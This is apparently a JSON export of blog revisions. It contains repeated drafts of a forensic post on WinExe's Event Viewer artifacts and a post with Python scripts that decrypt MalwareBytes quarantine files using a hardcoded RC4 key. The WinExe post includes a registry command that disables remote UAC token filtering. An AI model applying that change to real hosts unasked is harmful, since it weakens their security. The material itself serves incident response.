machine:\"]]],[10,0],[1,\"p\",[[0,[],0,\"To fix this issue, I had to run a registry fix on the Windows 7 host:\"]]],[10,1],[1,\"p\",[[0,[],0,\"After running that registry fix, WinExe now functions normally:\"]]],[10,2],[1,\"p\",[[0,[],0,\"The three screenshots below outline the forensic artifacts left behind in Windows Event Viewer. As you can see, not a whole lot of useful information is displayed. For example, there are no events created for commands run through WinExe.\"]]],[10,3],[10,4],[10,5],[1,\"p\",[]]]}","created_at_ts":1567695135618,"created_at":"2019-09-05T14:52:15.000Z"},{"id":"5d71212b992f0652efb51048","post_id":"5d711606992f0652efb50fa3","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"html\",{\"html\":\"ERROR: Failed to install service winexesvc - NT_STATUS_ACCESS_DENIED\"}],[\"html\",{\"html\":\"reg add \\\"HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\system\\\" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f\"}],[\"image\",{\"src\":\"/content/images/2019/09/Screen-Shot-2019-09-05-at-10.02.36-AM.png\"}],[\"image\",{\"src\":\"/content/images/2019/09/Screen-Shot-2019-09-04-at-4.10.38-PM.png\",\"cardWidth\":\"wide\",\"caption\":\"System Event ID 7045 fired during the winexesvc service creation.\"}],[\"image\",{\"src\":\"/content/images/2019/09/Screen-Shot-2019-09-04-at-4.13.46-PM.png\",\"cardWidth\":\"wide\",\"caption\":\"Security Event ID 4624 fired for the WinExe authentication event.\"}],[\"image\",{\"src\":\"/content/images/2019/09/Screen-Shot-2019-09-04-at-4.09.41-PM.png\",\"caption\":\"System Event ID 7036 fires for the service stopping and starting.\",\"cardWidth\":\"wide\"}]],\"markups\":[],\"sections\":[[1,\"p\",[[0,[],0,\"WinExe is a utility that allows linux hosts to remotely execute commands on a Windows machine. The functionality is very similar to PsExec.\"]]],[1,\"p\",[[0,[],0,\"Recently, an antivirus alert fired for the C:\\\\Windows\\\\winexesvc.exe executable. It is classified as Riskware or as a Hacktool when searching the hash on VirusTotal. Googling around, it appears that WinExe was being used by APT28 (Fancy Bear) as a lateral movement tool. However, since it can be used for legitimate management purposes, it is unwise to jump to conclusions before getting more context. This post outlines the artifacts left on the system after it has been used, specifically in Windows Event Viewer so that others facing this alert can create a timeline and find relevant information.\"]]],[1,\"p\",[[0,[],0,\"To investigate WinExe, I spun up a lab environment in Virtualbox consisting of Parrot OS and Windows 7.\"]]],[1,\"p\",[[0,[],0,\"The first hurdle I encountered was hitting the following error when trying to run WinExe on Parrot against the Windows 7 machine:\"]]],[10,0],[1,\"p\",[[0,[],0,\"To fix this issue, I had to run a registry fix on the Windows 7 host:\"]]],[10,1],[1,\"p\",[[0,[],0,\"After running that registry fix, WinExe now functions normally:\"]]],[10,2],[1,\"p\",[[0,[],0,\"The three screenshots below outline the forensic artifacts left behind in Windows Event Viewer. As you can see, not a whole lot of useful information is retained. For example, there are no events created for commands run through WinExe.\"]]],[10,3],[10,4],[10,5],[1,\"p\",[]]]}","created_at_ts":1567695147265,"created_at":"2019-09-05T14:52:27.000Z"},{"id":"5d712313992f0652efb5104b","post_id":"5d711606992f0652efb50fa3","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"code\",{\"code\":\"ERROR: Failed to install service winexesvc - NT_STATUS_ACCESS_DENIED\"}],[\"code\",{\"code\":\"reg add \\\"HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\system\\\" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f\",\"caption\":\"Run this inside of an Administrator command prompt.\"}],[\"image\",{\"src\":\"/content/images/2019/09/Screen-Shot-2019-09-05-at-10.02.36-AM.png\"}],[\"image\",{\"src\":\"/content/images/2019/09/Screen-Shot-2019-09-04-at-4.10.38-PM.png\",\"cardWidth\":\"wide\",\"caption\":\"System Event ID 7045 fired during the winexesvc service creation.\"}],[\"image\",{\"src\":\"/content/images/2019/09/Screen-Shot-2019-09-04-at-4.13.46-PM.png\",\"cardWidth\":\"wide\",\"caption\":\"Security Event ID 4624 fired for the WinExe authentication event.\"}],[\"image\",{\"src\":\"/content/images/2019/09/Screen-Shot-2019-09-04-at-4.09.41-PM.png\",\"caption\":\"System Event ID 7036 fires for the winexesvc service stopping and starting.\",\"cardWidth\":\"wide\"}]],\"markups\":[],\"sections\":[[1,\"p\",[[0,[],0,\"WinExe is a utility that allows linux hosts to remotely execute commands on a Windows machine. The functionality is very similar to PsExec.\"]]],[1,\"p\",[[0,[],0,\"Recently, an antivirus alert fired for the C:\\\\Windows\\\\winexesvc.exe executable. It is classified as Riskware or as a Hacktool when searching the hash on VirusTotal. Googling around, it appears that WinExe was being used by APT28 (Fancy Bear) as a lateral movement tool. However, since it can be used for legitimate management purposes, it is unwise to jump to conclusions before getting more context. This post outlines the artifacts left on the system after it has been used, specifically in Windows Event Viewer so that others facing this alert can create a timeline and find relevant information.\"]]],[1,\"p\",[[0,[],0,\"To investigate WinExe, I spun up a lab environment in Virtualbox consisting of Parrot OS and Windows 7.\"]]],[1,\"p\",[[0,[],0,\"The first hurdle I encountered was hitting the following error when trying to run WinExe on Parrot against the Windows 7 machine:\"]]],[10,0],[1,\"p\",[[0,[],0,\"To fix this issue, I had to run a registry fix on the Windows 7 host:\"]]],[10,1],[1,\"p\",[[0,[],0,\"After running that registry fix, WinExe now functions normally:\"]]],[10,2],[1,\"p\",[[0,[],0,\"The three screenshots below outline the forensic artifacts left behind in Windows Event Viewer. As you can see, not a whole lot of useful information is retained. For example, there are no events created for commands run through WinExe.\"]]],[10,3],[10,4],[10,5],[1,\"p\",[]]]}","created_at_ts":1567695635816,"created_at":"2019-09-05T15:00:35.000Z"},{"id":"5d712e09992f0652efb5104d","post_id":"5d711606992f0652efb50fa3","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"code\",{\"code\":\"ERROR: Failed to install service winexesvc - NT_STATUS_ACCESS_DENIED\"}],[\"code\",{\"code\":\"reg add \\\"HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\system\\\" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f\",\"caption\":\"Run this inside of an Administrator command prompt.\"}],[\"image\",{\"src\":\"/content/images/2019/09/Screen-Shot-2019-09-05-at-10.02.36-AM.png\"}],[\"image\",{\"src\":\"/content/images/2019/09/Screen-Shot-2019-09-04-at-4.10.38-PM.png\",\"cardWidth\":\"wide\",\"caption\":\"System Event ID 7045 fired during the winexesvc service creation.\"}],[\"image\",{\"src\":\"/content/images/2019/09/Screen-Shot-2019-09-04-at-4.13.46-PM.png\",\"cardWidth\":\"wide\",\"caption\":\"Security Event ID 4624 fired for the WinExe authentication event.\"}],[\"image\",{\"src\":\"/content/images/2019/09/Screen-Shot-2019-09-04-at-4.09.41-PM.png\",\"caption\":\"System Event ID 7036 fires for the winexesvc service stopping and starting.\",\"cardWidth\":\"wide\"}]],\"markups\":[],\"sections\":[[1,\"p\",[[0,[],0,\"WinExe is a utility that allows linux hosts to remotely execute commands on a Windows machine. The functionality is very similar to PsExec.\"]]],[1,\"p\",[[0,[],0,\"Recently, an antivirus alert fired for the C:\\\\Windows\\\\winexesvc.exe executable. It is classified as Riskware or as a Hacktool when searching the hash on VirusTotal. Googling around, it appears that WinExe was being used by APT28 (Fancy Bear) as a lateral movement tool. However, since it can be used for legitimate management purposes, it is unwise to jump to conclusions before getting more context. This post outlines the artifacts left on the system after it has been used, specifically in Windows Event Viewer so that others facing this alert can create a timeline and find relevant information.\"]]],[1,\"p\",[[0,[],0,\"To investigate WinExe, I spun up a lab environment in Virtualbox consisting of Parrot OS and Windows 7.\"]]],[1,\"p\",[[0,[],0,\"The first hurdle I encountered was hitting the following error when trying to run WinExe on Parrot against the Windows 7 machine:\"]]],[10,0],[1,\"p\",[[0,[],0,\"To fix this issue, I had to run a registry fix on the Windows 7 host:\"]]],[10,1],[1,\"p\",[[0,[],0,\"After running that registry fix, WinExe now functions normally:\"]]],[10,2],[1,\"p\",[[0,[],0,\"The three screenshots below outline the forensic artifacts left behind in Windows Event Viewer. As you can see, not a whole lot of useful information is retained. For example, there are no events created for commands run through WinExe.\"]]],[10,3],[1,\"p\",[]],[10,4],[1,\"p\",[]],[10,5],[1,\"p\",[]]]}","created_at_ts":1567698441936,"created_at":"2019-09-05T15:47:21.000Z"},{"id":"5d815e55992f0652efb510a0","post_id":"5d815601992f0652efb51051","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"code\",{\"code\":\"import sys, os\\nfrom arc4 import ARC4\\nimport hashlib\\n\\n\\nif len(sys.argv) < 2:\\n\\tprint(\\\"You must include a .quar file to decrypt!\\\")\\n\\tsys.exit(1)\\n\\nwith open(sys.argv[1], \\\"rb\\\") as encrypted_file:\\n\\tarc4 = ARC4( hashlib.md5('XBXM8362QIXD9+637HCB02/VN0JF6Z3)cB9UFZMdF3I.*c.,c5SbO7)WNZ8CY1(XMUDb'.encode('utf-8')).digest() )\\n\\tdecrypted = arc4.decrypt(encrypted_file.read())\\n\\twith open( sys.argv[1]+\\\".decrypted\\\", \\\"wb\\\") as decrypted_file:\\n\\t\\tdecrypted_file.write(decrypted)\\n\\t\\tdecrypted_file.close()\",\"language\":\"Python\"}],[\"code\",{\"code\":\"import hashlib\\nimport sys, os\\n\\nif len(sys.argv) < 2:\\n    print(\\\"You must include a .quar file to decrypt!\\\")\\n    sys.exit(1)\\n\\ndef rc4_decrypt(sbox, data):\\n    out = bytearray(len(data))\\n    i = 0\\n    j = 0\\n    for k in range(len(data)):\\n        i = (i + 1) % 256\\n        j = (j + sbox[i]) % 256\\n        tmp = sbox[i]\\n        sbox[i] = sbox[j]\\n        sbox[j] = tmp\\n        val = sbox[(sbox[i] + sbox[j]) % 256]\\n        out[k] = val ^ data[k]\\n\\n    return out\\n\\ndef mbam_ksa():\\n    # hardcoded key obtained from mbamcore.dll\\n    m = hashlib.md5()\\n    m.update(\\\"XBXM8362QIXD9+637HCB02/VN0JF6Z3)cB9UFZMdF3I.*c.,c5SbO7)WNZ8CY1(XMUDb\\\".encode('utf-8'))\\n    key = bytearray(m.digest())\\n    sbox = list(range(256))\\n    j = 0\\n    for i in range(256):\\n        j = (j + sbox[i] + key[i % len(key)]) % 256\\n        tmp = sbox[i]\\n        sbox[i] = sbox[j]\\n        sbox[j] = tmp\\n\\n    return sbox\\n\\ndef mbam_unquarantine(f):\\n    with open(f, \\\"rb\\\") as quarfile:\\n        data = bytearray(quarfile.read())\\n\\n    sbox = mbam_ksa()\\n    outdata = rc4_decrypt(sbox, data)\\n\\n    return outdata\\n\\ndef main():\\n    MBAMDequarantineFile = mbam_unquarantine(sys.argv[1])\\n    with open( sys.argv[1]+\\\".decrypted2\\\", \\\"wb\\\") as decrypted_file:\\n        decrypted_file.write(MBAMDequarantineFile)\\n        decrypted_file.close()\\n\\nmain()\\n\",\"language\":\"Python\"}]],\"markups\":[[\"a\",[\"href\",\"http://www.hexacorn.com/blog/2015/11/08/decrypting-malwarebytes-quar-files/\"]],[\"a\",[\"href\",\"https://github.com/brad-sp/cuckoo-modified/blob/master/lib/cuckoo/common/quarantine.py\"]],[\"a\",[\"href\",\"https://github.com/brad-sp/cuckoo-modified/blob/master/docs/LICENSE\"]]],\"sections\":[[1,\"p\",[[0,[],0,\"MalwareBytes will rename malicious files found during a virus scan to a GUID (e.g. 403dab27-42d6-40e4-8a8b-f4eb4a3ffe82) with a .quar extension. These files are encrypted using RC4 and a long 68 character key.\"]]],[1,\"p\",[[0,[],0,\"To decrypt these files, I looked online to see what was already available. I found \"],[0,[0],1,\"this blog post\"],[0,[],0,\", which included a Perl script to decrypt. Not being a fan of Perl, I decided to roll my own using Python. Below is what I came up with:\"]]],[10,0],[1,\"p\",[[0,[],0,\"This script does have a dependency of the arc4 Python library (pip3 install arc4), but it works and produces files with the same hash as the Perl script on the reference blog post.\"]]],[1,\"p\",[[0,[],0,\"Going a bit deeper into his blog post, he links to a Python file in the Cuckoo sandbox that is capable of decrypting MalwareBytes .quar files, among others. This is great, because we can utilize some of their code as it's already in Python! Just note that the code itself is licensed under the GPL. You can find the original file \"],[0,[1],1,\"here\"],[0,[],0,\" and their GPL license file \"],[0,[2],1,\"here\"],[0,[],0,\".\"]]],[10,1],[1,\"p\",[]]]}","created_at_ts":1568759381593,"created_at":"2019-09-17T22:29:41.000Z"},{"id":"5d815e66992f0652efb510a2","post_id":"5d815601992f0652efb51051","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"code\",{\"code\":\"import sys, os\\nfrom arc4 import ARC4\\nimport hashlib\\n\\n\\nif len(sys.argv) < 2:\\n\\tprint(\\\"You must include a .quar file to decrypt!\\\")\\n\\tsys.exit(1)\\n\\nwith open(sys.argv[1], \\\"rb\\\") as encrypted_file:\\n\\tarc4 = ARC4( hashlib.md5('XBXM8362QIXD9+637HCB02/VN0JF6Z3)cB9UFZMdF3I.*c.,c5SbO7)WNZ8CY1(XMUDb'.encode('utf-8')).digest() )\\n\\tdecrypted = arc4.decrypt(encrypted_file.read())\\n\\twith open( sys.argv[1]+\\\".decrypted\\\", \\\"wb\\\") as decrypted_file:\\n\\t\\tdecrypted_file.write(decrypted)\\n\\t\\tdecrypted_file.close()\",\"language\":\"Python\"}],[\"code\",{\"code\":\"import hashlib\\nimport sys, os\\n\\nif len(sys.argv) < 2:\\n    print(\\\"You must include a .quar file to decrypt!\\\")\\n    sys.exit(1)\\n\\ndef rc4_decrypt(sbox, data):\\n    out = bytearray(len(data))\\n    i = 0\\n    j = 0\\n    for k in range(len(data)):\\n        i = (i + 1) % 256\\n        j = (j + sbox[i]) % 256\\n        tmp = sbox[i]\\n        sbox[i] = sbox[j]\\n        sbox[j] = tmp\\n        val = sbox[(sbox[i] + sbox[j]) % 256]\\n        out[k] = val ^ data[k]\\n\\n    return out\\n\\ndef mbam_ksa():\\n    # hardcoded key obtained from mbamcore.dll\\n    m = hashlib.md5()\\n    m.update(\\\"XBXM8362QIXD9+637HCB02/VN0JF6Z3)cB9UFZMdF3I.*c.,c5SbO7)WNZ8CY1(XMUDb\\\".encode('utf-8'))\\n    key = bytearray(m.digest())\\n    sbox = list(range(256))\\n    j = 0\\n    for i in range(256):\\n        j = (j + sbox[i] + key[i % len(key)]) % 256\\n        tmp = sbox[i]\\n        sbox[i] = sbox[j]\\n        sbox[j] = tmp\\n\\n    return sbox\\n\\ndef mbam_unquarantine(f):\\n    with open(f, \\\"rb\\\") as quarfile:\\n        data = bytearray(quarfile.read())\\n\\n    sbox = mbam_ksa()\\n    outdata = rc4_decrypt(sbox, data)\\n\\n    return outdata\\n\\ndef main():\\n    MBAMDequarantineFile = mbam_unquarantine(sys.argv[1])\\n    with open( sys.argv[1]+\\\".decrypted2\\\", \\\"wb\\\") as decrypted_file:\\n        decrypted_file.write(MBAMDequarantineFile)\\n        decrypted_file.close()\\n\\nmain()\\n\",\"language\":\"Python\"}]],\"markups\":[[\"a\",[\"href\",\"http://www.hexacorn.com/blog/2015/11/08/decrypting-malwarebytes-quar-files/\"]],[\"a\",[\"href\",\"https://github.com/brad-sp/cuckoo-modified/blob/master/lib/cuckoo/common/quarantine.py\"]],[\"a\",[\"href\",\"https://github.com/brad-sp/cuckoo-modified/blob/master/docs/LICENSE\"]]],\"sections\":[[1,\"p\",[[0,[],0,\"MalwareBytes will rename malicious files found during a virus scan to a GUID (e.g. 403dab27-42d6-40e4-8a8b-f4eb4a3ffe82) with a .quar extension. These files are encrypted using RC4 and a long 68 character key.\"]]],[1,\"p\",[[0,[],0,\"To decrypt these files, I looked online to see what was already available. I found \"],[0,[0],1,\"this blog post\"],[0,[],0,\", which included a Perl script to decrypt. Not being a fan of Perl, I decided to roll my own using Python. Below is what I came up with:\"]]],[10,0],[1,\"p\",[[0,[],0,\"This script does have a dependency of the arc4 Python library (pip3 install arc4), but it works and produces files with the same hash as the Perl script on the reference blog post.\"]]],[1,\"p\",[[0,[],0,\"Going a bit deeper into his blog post, he links to a Python file in the Cuckoo sandbox that is capable of decrypting MalwareBytes .quar files, among others. This is great, because we can utilize some of their code as it's already in Python! You can find the original file \"],[0,[1],1,\"here\"],[0,[],0,\" and their GPL license file \"],[0,[2],1,\"here\"],[0,[],0,\".\"]]],[10,1],[1,\"p\",[]]]}","created_at_ts":1568759398253,"created_at":"2019-09-17T22:29:58.000Z"},{"id":"5d815e88992f0652efb510a4","post_id":"5d815601992f0652efb51051","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"code\",{\"code\":\"import sys, os\\nfrom arc4 import ARC4\\nimport hashlib\\n\\n\\nif len(sys.argv) < 2:\\n\\tprint(\\\"You must include a .quar file to decrypt!\\\")\\n\\tsys.exit(1)\\n\\nwith open(sys.argv[1], \\\"rb\\\") as encrypted_file:\\n\\tarc4 = ARC4( hashlib.md5('XBXM8362QIXD9+637HCB02/VN0JF6Z3)cB9UFZMdF3I.*c.,c5SbO7)WNZ8CY1(XMUDb'.encode('utf-8')).digest() )\\n\\tdecrypted = arc4.decrypt(encrypted_file.read())\\n\\twith open( sys.argv[1]+\\\".decrypted\\\", \\\"wb\\\") as decrypted_file:\\n\\t\\tdecrypted_file.write(decrypted)\\n\\t\\tdecrypted_file.close()\",\"language\":\"Python\"}],[\"code\",{\"code\":\"import hashlib\\nimport sys, os\\n\\nif len(sys.argv) < 2:\\n    print(\\\"You must include a .quar file to decrypt!\\\")\\n    sys.exit(1)\\n\\ndef rc4_decrypt(sbox, data):\\n    out = bytearray(len(data))\\n    i = 0\\n    j = 0\\n    for k in range(len(data)):\\n        i = (i + 1) % 256\\n        j = (j + sbox[i]) % 256\\n        tmp = sbox[i]\\n        sbox[i] = sbox[j]\\n        sbox[j] = tmp\\n        val = sbox[(sbox[i] + sbox[j]) % 256]\\n        out[k] = val ^ data[k]\\n\\n    return out\\n\\ndef mbam_ksa():\\n    # hardcoded key obtained from mbamcore.dll\\n    m = hashlib.md5()\\n    m.update(\\\"XBXM8362QIXD9+637HCB02/VN0JF6Z3)cB9UFZMdF3I.*c.,c5SbO7)WNZ8CY1(XMUDb\\\".encode('utf-8'))\\n    key = bytearray(m.digest())\\n    sbox = list(range(256))\\n    j = 0\\n    for i in range(256):\\n        j = (j + sbox[i] + key[i % len(key)]) % 256\\n        tmp = sbox[i]\\n        sbox[i] = sbox[j]\\n        sbox[j] = tmp\\n\\n    return sbox\\n\\ndef mbam_unquarantine(f):\\n    with open(f, \\\"rb\\\") as quarfile:\\n        data = bytearray(quarfile.read())\\n\\n    sbox = mbam_ksa()\\n    outdata = rc4_decrypt(sbox, data)\\n\\n    return outdata\\n\\ndef main():\\n    MBAMDequarantineFile = mbam_unquarantine(sys.argv[1])\\n    with open( sys.argv[1]+\\\".decrypted2\\\", \\\"wb\\\") as decrypted_file:\\n        decrypted_file.write(MBAMDequarantineFile)\\n        decrypted_file.close()\\n\\nmain()\\n\",\"language\":\"Python\"}]],\"markups\":[[\"a\",[\"href\",\"http://www.hexacorn.com/blog/2015/11/08/decrypting-malwarebytes-quar-files/\"]],[\"a\",[\"href\",\"https://github.com/brad-sp/cuckoo-modified/blob/master/lib/cuckoo/common/quarantine.py\"]],[\"a\",[\"href\",\"https://github.com/brad-sp/cuckoo-modified/blob/master/docs/LICENSE\"]]],\"sections\":[[1,\"p\",[[0,[],0,\"MalwareBytes will rename malicious files found during a virus scan to a GUID (e.g. 403dab27-42d6-40e4-8a8b-f4eb4a3ffe82) with a .quar extension. These files are encrypted using RC4 and a long 68 character key.\"]]],[1,\"p\",[[0,[],0,\"To decrypt these files, I looked online to see what was already available. I found \"],[0,[0],1,\"this blog post\"],[0,[],0,\", which included a Perl script to decrypt. Not being a fan of Perl, I decided to roll my own using Python. Below is what I came up with:\"]]],[10,0],[1,\"p\",[[0,[],0,\"This script does have a dependency of the arc4 Python library (pip3 install arc4), but it works and produces files with the same hash as the Perl script on the reference blog post.\"]]],[1,\"p\",[[0,[],0,\"Going a bit deeper into his blog post, he links to a Python file in the Cuckoo sandbox that is capable of decrypting MalwareBytes .quar files, among others. This is great, because we can utilize some of their code as it's already in Python! You can find the original file \"],[0,[1],1,\"here\"],[0,[],0,\" and their GPL license file \"],[0,[2],1,\"here\"],[0,[],0,\". I took snippets of their code, updated them for Python3, and then modified it slightly to work the same as the previous script:\"]]],[10,1],[1,\"p\",[]]]}","created_at_ts":1568759432710,"created_at":"2019-09-17T22:30:32.000Z"},{"id":"5d815eaa992f0652efb510a6","post_id":"5d815601992f0652efb51051","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"code\",{\"code\":\"import sys, os\\nfrom arc4 import ARC4\\nimport hashlib\\n\\n\\nif len(sys.argv) < 2:\\n\\tprint(\\\"You must include a .quar file to decrypt!\\\")\\n\\tsys.exit(1)\\n\\nwith open(sys.argv[1], \\\"rb\\\") as encrypted_file:\\n\\tarc4 = ARC4( hashlib.md5('XBXM8362QIXD9+637HCB02/VN0JF6Z3)cB9UFZMdF3I.*c.,c5SbO7)WNZ8CY1(XMUDb'.encode('utf-8')).digest() )\\n\\tdecrypted = arc4.decrypt(encrypted_file.read())\\n\\twith open( sys.argv[1]+\\\".decrypted\\\", \\\"wb\\\") as decrypted_file:\\n\\t\\tdecrypted_file.write(decrypted)\\n\\t\\tdecrypted_file.close()\",\"language\":\"Python\"}],[\"code\",{\"code\":\"import hashlib\\nimport sys, os\\n\\nif len(sys.argv) < 2:\\n    print(\\\"You must include a .quar file to decrypt!\\\")\\n    sys.exit(1)\\n\\ndef rc4_decrypt(sbox, data):\\n    out = bytearray(len(data))\\n    i = 0\\n    j = 0\\n    for k in range(len(data)):\\n        i = (i + 1) % 256\\n        j = (j + sbox[i]) % 256\\n        tmp = sbox[i]\\n        sbox[i] = sbox[j]\\n        sbox[j] = tmp\\n        val = sbox[(sbox[i] + sbox[j]) % 256]\\n        out[k] = val ^ data[k]\\n\\n    return out\\n\\ndef mbam_ksa():\\n    # hardcoded key obtained from mbamcore.dll\\n    m = hashlib.md5()\\n    m.update(\\\"XBXM8362QIXD9+637HCB02/VN0JF6Z3)cB9UFZMdF3I.*c.,c5SbO7)WNZ8CY1(XMUDb\\\".encode('utf-8'))\\n    key = bytearray(m.digest())\\n    sbox = list(range(256))\\n    j = 0\\n    for i in range(256):\\n        j = (j + sbox[i] + key[i % len(key)]) % 256\\n        tmp = sbox[i]\\n        sbox[i] = sbox[j]\\n        sbox[j] = tmp\\n\\n    return sbox\\n\\ndef mbam_unquarantine(f):\\n    with open(f, \\\"rb\\\") as quarfile:\\n        data = bytearray(quarfile.read())\\n\\n    sbox = mbam_ksa()\\n    outdata = rc4_decrypt(sbox, data)\\n\\n    return outdata\\n\\ndef main():\\n    MBAMDequarantineFile = mbam_unquarantine(sys.argv[1])\\n    with open( sys.argv[1]+\\\".decrypted2\\\", \\\"wb\\\") as decrypted_file:\\n        decrypted_file.write(MBAMDequarantineFile)\\n        decrypted_file.close()\\n\\nmain()\\n\",\"language\":\"Python\"}]],\"markups\":[[\"a\",[\"href\",\"http://www.hexacorn.com/blog/2015/11/08/decrypting-malwarebytes-quar-files/\"]],[\"a\",[\"href\",\"https://github.com/brad-sp/cuckoo-modified/blob/master/lib/cuckoo/common/quarantine.py\"]],[\"a\",[\"href\",\"https://github.com/brad-sp/cuckoo-modified/blob/master/docs/LICENSE\"]]],\"sections\":[[1,\"p\",[[0,[],0,\"MalwareBytes will rename malicious files found during a virus scan to a GUID (e.g. 403dab27-42d6-40e4-8a8b-f4eb4a3ffe82) with a .quar extension. These files are encrypted using RC4 and a long 68 character key.\"]]],[1,\"p\",[[0,[],0,\"To decrypt these files, I looked online to see what was already available. I found \"],[0,[0],1,\"this blog post\"],[0,[],0,\", which included a Perl script to decrypt. Not being a fan of Perl, I decided to roll my own using Python. Below is what I came up with:\"]]],[10,0],[1,\"p\",[[0,[],0,\"This script does have a dependency of the arc4 Python library (pip3 install arc4), but it works and produces files with the same hash as the Perl script on the reference blog post.\"]]],[1,\"p\",[[0,[],0,\"Going a bit deeper into his blog post, he links to a Python file in the Cuckoo sandbox that is capable of decrypting MalwareBytes .quar files, among others. This is great, because we can utilize some of their code as it's already in Python! You can find the original file \"],[0,[1],1,\"here\"],[0,[],0,\" and their GPL license file \"],[0,[2],1,\"here\"],[0,[],0,\". I took snippets of their code, updated them for Python3, and then modified it slightly to work the same as the previous script:\"]]],[10,1],[1,\"p\",[[0,[],0,\"While this script is much longer and does the exact same thing as the one I originally wrote, it \"]]]]}","created_at_ts":1568759466861,"created_at":"2019-09-17T22:31:06.000Z"},{"id":"5d815eb8992f0652efb510a8","post_id":"5d815601992f0652efb51051","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"code\",{\"code\":\"import sys, os\\nfrom arc4 import ARC4\\nimport hashlib\\n\\n\\nif len(sys.argv) < 2:\\n\\tprint(\\\"You must include a .quar file to decrypt!\\\")\\n\\tsys.exit(1)\\n\\nwith open(sys.argv[1], \\\"rb\\\") as encrypted_file:\\n\\tarc4 = ARC4( hashlib.md5('XBXM8362QIXD9+637HCB02/VN0JF6Z3)cB9UFZMdF3I.*c.,c5SbO7)WNZ8CY1(XMUDb'.encode('utf-8')).digest() )\\n\\tdecrypted = arc4.decrypt(encrypted_file.read())\\n\\twith open( sys.argv[1]+\\\".decrypted\\\", \\\"wb\\\") as decrypted_file:\\n\\t\\tdecrypted_file.write(decrypted)\\n\\t\\tdecrypted_file.close()\",\"language\":\"Python\"}],[\"code\",{\"code\":\"import hashlib\\nimport sys, os\\n\\nif len(sys.argv) < 2:\\n    print(\\\"You must include a .quar file to decrypt!\\\")\\n    sys.exit(1)\\n\\ndef rc4_decrypt(sbox, data):\\n    out = bytearray(len(data))\\n    i = 0\\n    j = 0\\n    for k in range(len(data)):\\n        i = (i + 1) % 256\\n        j = (j + sbox[i]) % 256\\n        tmp = sbox[i]\\n        sbox[i] = sbox[j]\\n        sbox[j] = tmp\\n        val = sbox[(sbox[i] + sbox[j]) % 256]\\n        out[k] = val ^ data[k]\\n\\n    return out\\n\\ndef mbam_ksa():\\n    # hardcoded key obtained from mbamcore.dll\\n    m = hashlib.md5()\\n    m.update(\\\"XBXM8362QIXD9+637HCB02/VN0JF6Z3)cB9UFZMdF3I.*c.,c5SbO7)WNZ8CY1(XMUDb\\\".encode('utf-8'))\\n    key = bytearray(m.digest())\\n    sbox = list(range(256))\\n    j = 0\\n    for i in range(256):\\n        j = (j + sbox[i] + key[i % len(key)]) % 256\\n        tmp = sbox[i]\\n        sbox[i] = sbox[j]\\n        sbox[j] = tmp\\n\\n    return sbox\\n\\ndef mbam_unquarantine(f):\\n    with open(f, \\\"rb\\\") as quarfile:\\n        data = bytearray(quarfile.read())\\n\\n    sbox = mbam_ksa()\\n    outdata = rc4_decrypt(sbox, data)\\n\\n    return outdata\\n\\ndef main():\\n    MBAMDequarantineFile = mbam_unquarantine(sys.argv[1])\\n    with open( sys.argv[1]+\\\".decrypted2\\\", \\\"wb\\\") as decrypted_file:\\n        decrypted_file.write(MBAMDequarantineFile)\\n        decrypted_file.close()\\n\\nmain()\\n\",\"language\":\"Python\"}]],\"markups\":[[\"a\",[\"href\",\"http://www.hexacorn.com/blog/2015/11/08/decrypting-malwarebytes-quar-files/\"]],[\"a\",[\"href\",\"https://github.com/brad-sp/cuckoo-modified/blob/master/lib/cuckoo/common/quarantine.py\"]],[\"a\",[\"href\",\"https://github.com/brad-sp/cuckoo-modified/blob/master/docs/LICENSE\"]]],\"sections\":[[1,\"p\",[[0,[],0,\"MalwareBytes will rename malicious files found during a virus scan to a GUID (e.g. 403dab27-42d6-40e4-8a8b-f4eb4a3ffe82) with a .quar extension. These files are encrypted using RC4 and a long 68 character key.\"]]],[1,\"p\",[[0,[],0,\"To decrypt these files, I looked online to see what was already available. I found \"],[0,[0],1,\"this blog post\"],[0,[],0,\", which included a Perl script to decrypt. Not being a fan of Perl, I decided to roll my own using Python. Below is what I came up with:\"]]],[10,0],[1,\"p\",[[0,[],0,\"This script does have a dependency of the arc4 Python library (pip3 install arc4), but it works and produces files with the same hash as the Perl script on the reference blog post.\"]]],[1,\"p\",[[0,[],0,\"Going a bit deeper into his blog post, he links to a Python file in the Cuckoo sandbox that is capable of decrypting MalwareBytes .quar files, among others. This is great, because we can utilize some of their code as it's already in Python! You can find the original file \"],[0,[1],1,\"here\"],[0,[],0,\" and their GPL license file \"],[0,[2],1,\"here\"],[0,[],0,\". I took snippets of their code, updated them for Python3, and then modified it slightly to work the same as the previous script:\"]]],[10,1],[1,\"p\",[[0,[],0,\"While this script is much longer and does the exact same thing as the one I originally wrote, it does not need the arc4 \"]]]]}","created_at_ts":1568759480684,"created_at":"2019-09-17T22:31:20.000Z"},{"id":"5d815ec5992f0652efb510aa","post_id":"5d815601992f0652efb51051","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"code\",{\"code\":\"import sys, os\\nfrom arc4 import ARC4\\nimport hashlib\\n\\n\\nif len(sys.argv) < 2:\\n\\tprint(\\\"You must include a .quar file to decrypt!\\\")\\n\\tsys.exit(1)\\n\\nwith open(sys.argv[1], \\\"rb\\\") as encrypted_file:\\n\\tarc4 = ARC4( hashlib.md5('XBXM8362QIXD9+637HCB02/VN0JF6Z3)cB9UFZMdF3I.*c.,c5SbO7)WNZ8CY1(XMUDb'.encode('utf-8')).digest() )\\n\\tdecrypted = arc4.decrypt(encrypted_file.read())\\n\\twith open( sys.argv[1]+\\\".decrypted\\\", \\\"wb\\\") as 